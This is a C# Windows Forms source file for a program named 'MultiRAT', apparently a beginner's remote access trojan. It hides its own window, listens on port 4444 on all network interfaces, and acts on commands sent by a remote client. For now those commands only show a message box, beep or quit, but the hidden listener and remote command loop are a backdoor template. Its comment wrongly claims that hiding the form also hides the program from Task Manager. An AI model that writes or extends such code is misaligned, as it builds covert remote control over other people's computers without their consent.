using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MultiRAT
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamReader streamReader;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide(); // Hides from taskbar and taskmanager
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            RunServer();
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            try
            {
                // Stores the message that the client sends to the server
                string line;
                // Command loop, LastOndexOf is for searching within the
                // network stream for command strings sent by the client
                while (true)
                {
                    line = "";
                    line = streamReader.ReadLine();
                    if (line.LastIndexOf("m") >=0)
                       MessageBox.Show("Hello world");
                    if (line.LastIndexOf("b") >= 0)
                        Console.Beep(500, 2000);
                    if (line.LastIndexOf("q") >= 0)
                        throw new Exception(); //so that it will be caught below and gracefully close
                }
            }
            catch (Exception err)
            {
                streamReader.Close();
                networkStream.Close();
                socketForClient.Close();
                System.Environment.Exit(System.Environment.ExitCode);                
            }
        }
    }
}
